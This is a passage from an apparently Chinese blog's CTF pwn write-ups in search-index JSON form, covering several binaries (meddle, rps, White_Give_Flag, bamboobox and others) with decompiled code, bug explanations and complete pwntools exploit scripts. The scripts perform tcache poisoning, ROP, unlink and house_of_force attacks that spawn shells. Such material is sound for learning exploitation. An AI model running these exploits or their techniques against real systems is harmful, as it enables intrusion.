Week 9","uri":"/challenges-100-week-9/#meddle"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ","date":"2021-04-18","objectID":"/challenges-100-week-9/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#checksec"},{"categories":["Writeups"],"content":"IDAadd int add_album() { int v0; // eax __int64 v1; // rcx void **v2; // rax char *v4; // [rsp+8h] [rbp-8h] if ( count \u003e 17 ) { LODWORD(v2) = puts(\"no more albums :(\"); } else { v4 = (char *)malloc(0x84uLL); printf(\"enter album name: \"); fgets(v4 + 4, 80, stdin); printf(\"enter artist name: \"); fgets(v4 + 84, 48, stdin); v0 = count++; v1 = 8LL * v0; v2 = \u0026albums; *(void **)((char *)\u0026albums + v1) = v4; } return (int)v2; } view int view_album() { __int64 v0; // rax int v2; // [rsp+Ch] [rbp-4h] printf(\"what album would you like to view? \"); v2 = getnum(); if ( v2 \u003c 0 || v2 \u003e= count ) { LODWORD(v0) = puts(\"invalid index :(\"); } else { v0 = (__int64)*(\u0026albums + v2); if ( v0 ) { printf(\"album name: %s\\n\", (const char *)*(\u0026albums + v2) + 4); printf(\"artist: %s\\n\", (const char *)*(\u0026albums + v2) + 84); LODWORD(v0) = printf(\"ratings: %d\\n\", *(unsigned int *)*(\u0026albums + v2)); } } return v0; } rate int rate_album() { __int64 v0; // rax _DWORD *v1; // rbx int v3; // [rsp+Ch] [rbp-14h] printf(\"what album would you like to rate? \"); v3 = getnum(); if ( v3 \u003c 0 || v3 \u003e= count ) { LODWORD(v0) = puts(\"invalid index :(\"); } else { v0 = (__int64)*(\u0026albums + v3); if ( v0 ) { printf(\"\\nwhat do you want to rate this album? \"); v1 = *(\u0026albums + v3); LODWORD(v0) = getnum(); *v1 = v0; } } return v0; } delete void delete_album() { int v0; // [rsp+Ch] [rbp-4h] printf(\"what album would you like to delete? \"); v0 = getnum(); if ( v0 \u003c 0 || v0 \u003e= count ) puts(\"invalid index :(\"); else free(*(\u0026albums + v0)); } 漏洞点为free时没有将指针销毁，且没用任何标志，造成了UAF。libc版本为2.27，有tcache但是没有double free检查。 首先，将tcache填满，再利用UAF，leak main_arena的地址。之后利用tcache_poisoning，申请到__free_hook，将其覆写为onegadget ","date":"2021-04-18","objectID":"/challenges-100-week-9/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#ida"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.log_level=\"DEBUG\" context.arch=\"amd64\" local=1 binary='./meddle' #gdb.attach(p) if local: p=process(binary) else: p=remote('220.249.52.133',32446) elf = ELF(binary,checksec=False) libc = ELF('./libc-2.27.so') def add(album, artist): p.recvuntil('\u003e ') p.sendline('1') p.recvuntil('enter album name: ') p.sendline(str(album)) p.recvuntil('enter artist name: ') p.sendline(str(artist)) def view(index): p.recvuntil('\u003e ') p.sendline('2') p.recvuntil('what album would you like to view? ') p.sendline(str(index)) def rate(index,rate): p.recvuntil('\u003e ') p.sendline('3') p.recvuntil('what do you want to rate this album? ') p.sendline(str(rate)) def dele(index): p.recvuntil('\u003e ') p.sendline('4') p.recvuntil('what album would you like to delete? ') p.sendline(str(index)) for i in range(7): add(str(i)*4,str(i)*4) add('aaa','aaa') # 7 add('bbb','bbb') # 8 for i in range(7): dele(i) dele(7) #gdb.attach(p) view(7) high_bits = hex(u16(p.recvuntil('\\x7f')[-2:].ljust(2,b'\\x00'))) p.recvuntil('ratings: ') low_bits = \"%x\" % int(p.recvuntil('\\n')[:-1]) main_arena = high_bits+low_bits main_arena = int(main_arena.replace(\"-\", \"\"), 16) - 96 leak('main_arena',main_arena) malloc_hook = main_arena - 0x10 libcbase = main_arena - 0x3ebd00 offset = 0x7f158ab6a8e8-0x7f158ab68c30 free_hook = libcbase + libc.sym['__free_hook'] leak('malloc_hook',malloc_hook) leak('libcbase',libcbase) leak('free_hook',free_hook) for i in range(5): add(str(i)*4,str(i)*4) #9 10 11 12 13 dele(12) dele(12) add(p32(free_hook \u003e\u003e 32), \"bbb\")#14 rate(12, free_hook \u0026 0xffffffff) add('nnn','nnn')#15 one_gadget = libcbase + 0x4f322 add(p32(one_gadget \u003e\u003e 32), \"bbb\") #16 rate(16, one_gadget \u0026 0xffffffff) p.recvuntil('\u003e ') p.sendline('5') p.interactive() ","date":"2021-04-18","objectID":"/challenges-100-week-9/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#exp"},{"categories":["Writeups"],"content":"rps","date":"2021-04-18","objectID":"/challenges-100-week-9/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#rps"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"2021-04-18","objectID":"/challenges-100-week-9/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#checksec-1"},{"categories":["Writeups"],"content":"IDA void play() { unsigned int v0; // eax int v1; // [rsp+4h] [rbp-Ch] BYREF int v2; // [rsp+8h] [rbp-8h] char v3; // [rsp+Fh] [rbp-1h] v3 = 1; v0 = time(0LL); srand(v0); while ( v3 ) { v2 = rand() % 3 + 1; sub_4012C9(); __isoc99_scanf(off_404028, \u0026v1); getchar(); if ( v2 == v1 ) puts(\"Congrats you win!!!!!\"); else puts(\"You lose!\"); putchar(10); printf(\"Would you like to play again? [yes/no]: \"); read(0, \u0026s2, 0x19uLL); if ( !strcmp(\"no\\n\", \u0026s2) ) { v3 = 0; } else if ( !strcmp(\"yes\\n\", \u0026s2) ) { v3 = 1; } else { puts(\"Well you didn't say yes or no..... So I'm assuming no.\"); v3 = 0; } memset(\u0026s2, 0, 4uLL); } } read(0, \u0026s2, 0x19uLL);覆写off_404028，使其变成%s，从而产生溢出。 ","date":"2021-04-18","objectID":"/challenges-100-week-9/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#ida-1"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.log_level=\"DEBUG\" context.arch=\"amd64\" local=1 binary='./rps' #gdb.attach(p) if local: p=process(binary) else: p=remote('220.249.52.133',32446) elf = ELF(binary,checksec=False) libc = ELF('./libc-2.31.so') read_got = elf.got['read'] puts_plt = elf.plt['puts'] pop_rdi = 0x0000000000401513 one = [0xe6c7e,0xe6c81,0xe6c84] p.sendlineafter('[y/n]: ',b'y') p.sendlineafter('\u003e ',b'1') # gdb.attach(p) payload = b'yes\\n'+b'\\x00'*(0x19-4-1)+b'\\x08' p.sendlineafter('[yes/no]: ',payload) payload = b'a'*0x14+p64(pop_rdi)+p64(read_got)+p64(puts_plt)+p64(0x401453) p.sendlineafter('\u003e ',payload) p.sendlineafter('[yes/no]: ','no\\n') read_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) libcbase = read_addr - libc.sym['read'] system = libcbase+libc.sym['system'] binsh=next(libc.search(b\"/bin/sh\")) one_gadget = libcbase+one[1] leak('libcbase',libcbase) gdb.attach(p) pop_4=0x000000000040150c ret = 0x040101a p.sendlineafter('[y/n]:',b'y') payload = b'a'*0x14+p64(one_gadget)+p64(pop_rdi)+p64(binsh)+p64(system) p.sendlineafter('\u003e ',payload) p.sendlineafter('[yes/no]: ','no\\n') p.interactive() ","date":"2021-04-18","objectID":"/challenges-100-week-9/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#exp-1"},{"categories":["Writeups"],"content":"White_Give_Flag","date":"2021-04-18","objectID":"/challenges-100-week-9/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#white_give_flag"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ","date":"2021-04-18","objectID":"/challenges-100-week-9/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#checksec-2"},{"categories":["Writeups"],"content":"IDA v0 = time(0LL); srand(v0); qword_202120[0] = (__int64)aThereIsNoVulnI; qword_202128 = (__int64)aThereIsNoVulnI_0; qword_202130 = (__int64)aThereIsNoVulnI_1; qword_202138 = (__int64)aThereIsNoVulnI_2; qword_202140 = (__int64)aBye; s = (char *)malloc(0x200uLL); for ( i = 0LL; i \u003c random() % 11 + 5; ++i ) { memset(s, 0, 0x100uLL); free(s); v1 = random(); s = (char *)malloc(v1 % 0x201 + 0x300); open(\"./flag\", 0); read(3, s + 16, 0x26uLL); close(3); } free(s); main void __fastcall main(__int64 a1, char **a2, char **a3) { int v3; // [rsp+Ch] [rbp-4h] sub_B1A(a1, a2, a3); while ( 1 ) { menu(); v3 = choice(); puts((const char *)qword_202120[v3 - 1]); switch ( v3 ) { case 1: add(); break; case 2: show(); break; case 3: dele(); break; case 4: edit(); break; case 5: exit(0); default: puts(\"Invalid!\"); exit(0); } } } 是个不同寻常的堆题，再进入菜单前，申请了随机size为0x300-0x500的chunk，并将flag，放到了偏移+0x10的位置。 v3 = choice();返回的是读取的字节数，puts((const char *)qword_202120[v3 - 1]);这里根据选项将一段字符进行了输出。 qword_202120附近是chunk数组的地址，它前面就是chunk[3]。 利用思路是，先随机申请三个小chunk，最后申请一个较大的chunk，这些chunk都是从包含flag的那个chunk中分割出来的，将前面的\\x00使用edit进行填补。之后通过截断输入流使v3=0，这样puts就会输出chunk中的内容。进行爆破，若最后申请的chunk正好到flag的位置。 ","date":"2021-04-18","objectID":"/challenges-100-week-9/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#ida-2"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{:#x}'.format(name,hex(addr))) # context.log_level=\"DEBUG\" context.arch=\"amd64\" local=0 binary='./White_Give_Flag' #gdb.attach(p) # if local: # sh=process(binary) # else: # sh=remote('node4.buuoj.cn', 39123) elf = ELF(binary,checksec=False) def add(size): sh.sendlineafter('choice:','') sh.sendlineafter('size:',str(size)) def show(): sh.sendlineafter('choice:','2') def dele(index): sh.sendlineafter('choice:','33') sh.sendlineafter('index:',str(index)) def edit(index,content): sh.sendlineafter('choice:','444') sh.sendlineafter('index:',str(index)) sh.sendlineafter('Content:',str(content)) def exit(): sh.sendlineafter('choice:','5555') while True: sh=remote('node4.buuoj.cn', 39123) add(0x10) add(0x10) add(0x10) add(0x310) edit(3,'+'*0x10) # sh.recvuntil('choice:') sh.shutdown_raw('send') flag = sh.recv() log.info(flag) if 'vnctf{' in flag or '}' in flag: exit(0) sh.close() sleep(1) ","date":"2021-04-18","objectID":"/challenges-100-week-9/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#exp-2"},{"categories":["Writeups"],"content":"Secure Login #include \u003cstdio.h\u003e char password[128]; void generate_password() { FILE *file = fopen(\"/dev/urandom\",\"r\"); fgets(password, 128, file); fclose(file); } void main() { puts(\"Welcome to my ultra secure login service!\"); // no way they can guess my password if it's random! generate_password(); char input[128]; printf(\"Enter the password: \"); fgets(input, 128, stdin); if (strcmp(input, password) == 0) { char flag[128]; FILE *file = fopen(\"flag.txt\",\"r\"); if (!file) { puts(\"Error: missing flag.txt.\"); exit(1); } fgets(flag, 128, file); puts(flag); } else { puts(\"Wrong!\"); } } 这里通过/dev/urandom生成的随机密码，strcmp在比较的的两个字符串，所以传入的数据都当作字符串进行处理，当遇到’\\x00’和’\\n’的时候，比较就结束了。 通过/dev/urandom生成的字符串也是有一定的几率生成开头就’\\x00’截断的字符的，所以通过暴力破解就可以bypass检查。 ","date":"2021-04-18","objectID":"/challenges-100-week-9/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#secure-login"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) #context.log_level=\"DEBUG\" #context.arch=\"amd64\" context.log_level = 'error' local=1 binary='./login' #gdb.attach(sh) # if local: # sh=process(binary) # else: # sh=remote('shell.actf.co',21820) # elf = ELF(binary,checksec=False) #libc = ELF('./libc-2.271.so') #gdb.attach(sh) for i in range(10000): sh=process(binary) sh.sendline('\\x00') sh.recvuntil(': ') buf = sh.recv() if (not 'Wrong!' in buf): print(buf) sh.close() ","date":"2021-04-18","objectID":"/challenges-100-week-9/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#exp-3"},{"categories":["Writeups"],"content":"RAIId Shadow Legends #include \u003ciostream\u003e#include \u003cfstream\u003e#include \u003cstring\u003e using namespace std; ifstream flag(\"flag.txt\"); struct character { int health; int skill; long tokens; string name; }; void play() { string action; character player; cout \u003c\u003c \"Enter your name: \" \u003c\u003c flush; getline(cin, player.name); cout \u003c\u003c \"Welcome, \" \u003c\u003c player.name \u003c\u003c \". Skill level: \" \u003c\u003c player.skill \u003c\u003c endl; while (true) { cout \u003c\u003c \"\\n1. Power up\" \u003c\u003c endl; cout \u003c\u003c \"2. Fight for the flag\" \u003c\u003c endl; cout \u003c\u003c \"3. Exit game\\n\" \u003c\u003c endl; cout \u003c\u003c \"What would you like to do? \" \u003c\u003c flush; cin \u003e\u003e action; cin.ignore(); if (action == \"1\") { cout \u003c\u003c \"Power up requires shadow tokens, available via in app purchase.\" \u003c\u003c endl; } else if (action == \"2\") { if (player.skill \u003c 1337) { cout \u003c\u003c \"You flail your arms wildly, but it is no match for the flag guardian. Raid failed.\" \u003c\u003c endl; } else if (player.skill \u003e 1337) { cout \u003c\u003c \"The flag guardian quickly succumbs to your overwhelming power. But the flag was destroyed in the frenzy!\" \u003c\u003c endl; } else { cout \u003c\u003c \"It's a tough battle, but you emerge victorious. The flag has been recovered successfully: \" \u003c\u003c flag.rdbuf() \u003c\u003c endl; } } else if (action == \"3\") { return; } } } void terms_and_conditions() { string agreement; string signature; cout \u003c\u003c \"\\nRAIId Shadow Legends is owned and operated by Working Group 21, Inc. \"; cout \u003c\u003c \"As a subsidiary of the International Organization for Standardization, \"; cout \u003c\u003c \"we reserve the right to standardize and/or destandardize any gameplay \"; cout \u003c\u003c \"elements that are deemed fraudulent, unnecessary, beneficial to the \"; cout \u003c\u003c \"player, or otherwise undesirable in our authoritarian society where \"; cout \u003c\u003c \"social capital has been eradicated and money is the only source of \"; cout \u003c\u003c \"power, legal or otherwise.\\n\" \u003c\u003c endl; cout \u003c\u003c \"Do you agree to the terms and conditions? \" \u003c\u003c flush; cin \u003e\u003e agreement; cin.ignore(); while (agreement != \"yes\") { cout \u003c\u003c \"Do you agree to the terms and conditions? \" \u003c\u003c flush; cin \u003e\u003e agreement; cin.ignore(); } cout \u003c\u003c \"Sign here: \" \u003c\u003c flush; getline(cin, signature); } int main() { cout \u003c\u003c \"Welcome to RAIId Shadow Legends!\" \u003c\u003c endl; while (true) { cout \u003c\u003c \"\\n1. Start game\" \u003c\u003c endl; cout \u003c\u003c \"2. Purchase shadow tokens\\n\" \u003c\u003c endl; cout \u003c\u003c \"What would you like to do? \" \u003c\u003c flush; string action; cin \u003e\u003e action; cin.ignore(); if (action == \"1\") { terms_and_conditions(); play(); } else if (action == \"2\") { cout \u003c\u003c \"Please mail a check to RAIId Shadow Legends Headquarters, 1337 Leet Street, 31337.\" \u003c\u003c endl; } } } 在生成玩家信息的时候，没有进行任何的修改操作，仅仅是输出。所以如果栈的那个位置本来就是1337就会满足要求。 所以在terms_and_conditions输入0x539就可能改变栈内容。 ","date":"2021-04-18","objectID":"/challenges-100-week-9/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#raiid-shadow-legends"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0} addr ---\u003e {1}'.format(name, hex(addr))) context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=1 binary='./raiid_shadow_legends' #gdb.attach(sh) if local: sh=process(binary) else: sh=remote('shell.actf.co',21300) elf = ELF(binary,checksec=False) #libc = ELF('./libc-2.271.so') sh.sendlineafter('What would you like to do?','1') for i in range(10): sh.sendlineafter('Do you agree to the terms and conditions?',p32(0x539)*2) sh.sendlineafter('Do you agree to the terms and conditions?','yes') sh.sendlineafter('Sign here:',p32(0x539)*2) sh.sendlineafter('Enter your name:',p32(0x539)*2) sh.sendline('2') sh.interactive() ","date":"2021-04-18","objectID":"/challenges-100-week-9/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#exp-4"},{"categories":["Writeups"],"content":"Challenges_100-Week_8 Challenges Tricks BUU-hitcontraining-magicheap unsortedbin attack BUU-hitcontraining_bamboobax unlink/house_of_force BUU-0ctf_2017_babyheap heap overflow+house_of_spirit BUU-heapcreator off-by-one BUU-[ZJCTF2019]easyheap unlink 安恒三月赛-fruitpie mmap attack NahamconCTF-2021-sort_it 数组超界+ROP ","date":"2021-04-18","objectID":"/challenges-100-week-8/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#challenges_100-week_8"},{"categories":["Writeups"],"content":"BUU-hitcontraining-magicheap","date":"2021-04-18","objectID":"/challenges-100-week-8/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#buu-hitcontraining-magicheap"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"2021-04-18","objectID":"/challenges-100-week-8/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#checksec"},{"categories":["Writeups"],"content":"IDAcreate unsigned __int64 create_heap() { int i; // [rsp+4h] [rbp-1Ch] size_t size; // [rsp+8h] [rbp-18h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); for ( i = 0; i \u003c= 9; ++i ) { if ( !*(\u0026heaparray + i) ) { printf(\"Size of Heap : \"); read(0, buf, 8uLL); size = atoi(buf); *(\u0026heaparray + i) = malloc(size); if ( !*(\u0026heaparray + i) ) { puts(\"Allocate Error\"); exit(2); } printf(\"Content of heap:\"); read_input(*(\u0026heaparray + i), size); puts(\"SuccessFul\"); return __readfsqword(0x28u) ^ v4; } } return __readfsqword(0x28u) ^ v4; } edit unsigned __int64 edit_heap() { int v1; // [rsp+4h] [rbp-1Ch] __int64 v2; // [rsp+8h] [rbp-18h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"Index :\"); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 \u003c 0 || v1 \u003e 9 ) { puts(\"Out of bound!\"); _exit(0); } if ( *(\u0026heaparray + v1) ) { printf(\"Size of Heap : \"); read(0, buf, 8uLL); v2 = atoi(buf); printf(\"Content of heap : \"); read_input(*(\u0026heaparray + v1), v2); puts(\"Done !\"); } else { puts(\"No such heap !\"); } return __readfsqword(0x28u) ^ v4; } delete unsigned __int64 delete_heap() { int v1; // [rsp+Ch] [rbp-14h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"Index :\"); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 \u003c 0 || v1 \u003e 9 ) { puts(\"Out of bound!\"); _exit(0); } if ( *(\u0026heaparray + v1) ) { free(*(\u0026heaparray + v1)); *(\u0026heaparray + v1) = 0LL; puts(\"Done !\"); } else { puts(\"No such heap !\"); } return __readfsqword(0x28u) ^ v3; } 跟ZJCTF2019一样的题目不过将后门改成了get shell，可以进行利用了。这里只要向magic写一个大数就好，所以想到使用unsortedbin attack。改了改脚本直接打。 ","date":"2021-04-18","objectID":"/challenges-100-week-8/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#ida"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, addr)) context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./magicheap' #gdb.attach(sh) if local: sh=process(binary) else: sh=remote('node3.buuoj.cn',29693) elf = ELF(binary,checksec=False) #libc = ELF('./libc-2.271.so') system_plt = elf.plt[\"system\"] free_got = elf.got[\"free\"] def add(size,content): sh.sendline(\"1\") sh.sendafter('Size of Heap : ', str(size)) sh.sendafter('Content of heap:', str(content)) def edit(index, size, content): sh.sendline(\"2\") sh.sendafter(\"Index :\", str(index)) sh.sendafter('Size of Heap : ', str(size)) sh.sendafter('Content of heap : ', str(content)) def free(index): sh.sendline(\"3\") sh.sendafter(\"Index :\", str(index)) heap_arry = 0x6020C0-8 magic = 0x6020A0 add(0x80,'a'*0x80) #0 add(0x80,'b'*0x80) #1 add(0x10,\"/bin/sh\\x00\\x00\\x00\") #2 free(1) payload = '' payload=payload.ljust(0x80,'a') payload+=p64(0)+p64(0x91)+p64(magic)+p64(magic-0x10) edit(0, 0x110, payload) add(0x80,'c'*0x80) #gdb.attach(sh) sh.sendline('4869') sh.interactive() ","date":"2021-04-18","objectID":"/challenges-100-week-8/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#exp"},{"categories":["Writeups"],"content":"BUU-hitcontraining_bamboobax","date":"2021-04-18","objectID":"/challenges-100-week-8/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#buu-hitcontraining_bamboobax"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ","date":"2021-04-18","objectID":"/challenges-100-week-8/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#checksec-1"},{"categories":["Writeups"],"content":"IDAshow int show_item() { int i; // [rsp+Ch] [rbp-4h] if ( !num ) return puts(\"No item in the box\"); for ( i = 0; i \u003c= 99; ++i ) { if ( *((_QWORD *)\u0026unk_6020C8 + 2 * i) ) printf(\"%d : %s\", (unsigned int)i, *((const char **)\u0026unk_6020C8 + 2 * i)); } return puts(byte_401089); } add __int64 add_item() { int i; // [rsp+4h] [rbp-1Ch] int v2; // [rsp+8h] [rbp-18h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); if ( num \u003e 99 ) { puts(\"the box is full\"); } else { printf(\"Please enter the length of item name:\"); read(0, buf, 8uLL); v2 = atoi(buf); if ( !v2 ) { puts(\"invaild length\"); return 0LL; } for ( i = 0; i \u003c= 99; ++i ) { if ( !*((_QWORD *)\u0026unk_6020C8 + 2 * i) ) { *((_DWORD *)\u0026itemlist + 4 * i) = v2; *((_QWORD *)\u0026unk_6020C8 + 2 * i) = malloc(v2); printf(\"Please enter the name of item:\"); *(_BYTE *)(*((_QWORD *)\u0026unk_6020C8 + 2 * i) + (int)read(0, *((void **)\u0026unk_6020C8 + 2 * i), v2)) = 0; ++num; return 0LL; } } } return 0LL; } edit unsigned __int64 change_item() { int v1; // [rsp+4h] [rbp-2Ch] int v2; // [rsp+8h] [rbp-28h] char buf[16]; // [rsp+10h] [rbp-20h] BYREF char nptr[8]; // [rsp+20h] [rbp-10h] BYREF unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); if ( num ) { printf(\"Please enter the index of item:\"); read(0, buf, 8uLL); v1 = atoi(buf); if ( *((_QWORD *)\u0026unk_6020C8 + 2 * v1) ) { printf(\"Please enter the length of item name:\"); read(0, nptr, 8uLL); v2 = atoi(nptr); printf(\"Please enter the new name of the item:\"); *(_BYTE *)(*((_QWORD *)\u0026unk_6020C8 + 2 * v1) + (int)read(0, *((void **)\u0026unk_6020C8 + 2 * v1), v2)) = 0; } else { puts(\"invaild index\"); } } else { puts(\"No item in the box\"); } return __readfsqword(0x28u) ^ v5; } delete unsigned __int64 remove_item() { int v1; // [rsp+Ch] [rbp-14h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); if ( num ) { printf(\"Please enter the index of item:\"); read(0, buf, 8uLL); v1 = atoi(buf); if ( *((_QWORD *)\u0026unk_6020C8 + 2 * v1) ) { free(*((void **)\u0026unk_6020C8 + 2 * v1)); *((_QWORD *)\u0026unk_6020C8 + 2 * v1) = 0LL; *((_DWORD *)\u0026itemlist + 4 * v1) = 0; puts(\"remove successful!!\"); --num; } else { puts(\"invaild index\"); } } else { puts(\"No item in the box\"); } return __readfsqword(0x28u) ^ v3; } 在edit有溢出，有一个管理堆块的数组，首先想到unlink。 这里还有一种方法，利用house_of_force。在开始申请了一个0x10的chunk，用来放hello_messsage和goodbye_message函数的地址，我们通过house_of_force将top chunk迁移到这个chunk附近，从而修改其中的内容。但是由于buu不提供题目靶机环境复现，所以这种方法只能用来练习。 ","date":"2021-04-18","objectID":"/challenges-100-week-8/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#ida-1"},{"categories":["Writeups"],"content":"expunlink from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./bamboobox' #gdb.attach(sh) if local: sh=process(binary) else: sh=remote('node3.buuoj.cn',27159) elf = ELF(binary,checksec=False) #libc = ELF('./libc-2.271.so') #gdb.attach(sh) def show(): sh.sendline(\"1\") def add(size,content): sh.sendline(\"2\") sh.sendafter(\"Please enter the length of item name:\",str(size)) sh.sendafter('Please enter the name of item:',str(content)) def edit(index, size, content): sh.sendline(\"3\") sh.sendlineafter('Please enter the index of item:',str(index)) sh.sendafter('Please enter the length of item name:',str(size)) sh.sendafter('Please enter the new name of the item:',str(content)) def free(index): sh.sendline('4') sh.sendlineafter('Please enter the index of item:',str(index)) array = 0x6020C8 atoi_got = elf.got['atoi'] add(0x40,'a'*0x40) #0 add(0x80,'b'*0x80) #1 add(0x40,'c'*0x40) #2 add(0x10,'/bin/sh\\x00\\x00\\x00') #4 #gdb.attach(sh) payload = p64(0)+p64(0x41)+p64(array-0x18)+p64(array-0x10) payload=payload.ljust(0x40,'n') payload+=p64(0x40)+p64(0x90) edit(0,0x80,payload) #gdb.attach(sh) free(1) payload = p64(0x40)*3+p64(atoi_got) edit(0,0x80,payload) show() atoi_addr = u64(sh.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) leak('atoi',atoi_addr) libc = LibcSearcher('atoi',atoi_addr) libcbase = atoi_addr-libc.dump('atoi') system = libcbase+libc.dump('system') edit(0,0x80,p64(system)) sh.sendline('/bin/sh\\x00') sh.interactive() house_of_force from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=1 binary='./bamboobox' #gdb.attach(sh) if local: sh=process(binary) else: sh=remote('node3.buuoj.cn',27159) elf = ELF(binary,checksec=False) #libc = ELF('./libc-2.271.so') #gdb.attach(sh) def show(): sh.sendline(\"1\") def add(size,content): sh.sendline(\"2\") sh.sendafter(\"Please enter the length of item name:\",str(size)) sh.sendafter('Please enter the name of item:',str(content)) def edit(index, size, content): sh.sendline(\"3\") sh.sendlineafter('Please enter the index of item:',str(index)) sh.sendafter('Please enter the length of item name:',str(size)) sh.sendafter('Please enter the new name of the item:',str(content)) def free(index): sh.sendline('4') sh.sendlineafter('Please enter the index of item:',str(index)) array = 0x6020C8 magic = 0x400D49 atoi_got = elf.got['atoi'] add(0x30,'a'*0x30) #0 payload='a'*0x30+p64(0)+'\\xff'*8 edit(0,0x80,payload) offset = -(0x60+0x8+0xf) #gdb.attach(sh) add(offset,'a\\n')#1 add(0x10,'a\\n') edit(2,0x10,p64(magic)*2) sh.sendline('5') sh.interactive() ","date":"2021-04-18","objectID":"/challenges-100-week-8/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#exp-1"},{"categories":["Writeups"],"content":"BUU-0ctf_2017_babyheap","date":"2021-04-18","objectID":"/challenges-100-week-8/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#buu-0ctf_2017_babyheap"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ","date":"2021-04-18","objectID":"/challenges-100-week-8/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#checksec-2"},{"categories":["Writeups"],"content":"IDAcreate void __fastcall sub_D48(__int64 a1) { int i; // [rsp+10h] [rbp-10h] int v2; // [rsp+14h] [rbp-Ch] void *v3; // 